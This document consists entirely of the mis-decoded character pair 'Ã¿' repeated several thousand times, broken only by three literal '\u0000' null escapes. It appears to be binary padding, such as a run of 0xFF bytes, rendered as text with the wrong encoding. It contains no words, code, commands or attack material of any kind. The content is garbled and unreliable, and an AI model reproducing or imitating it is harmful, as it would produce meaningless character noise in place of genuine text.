¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿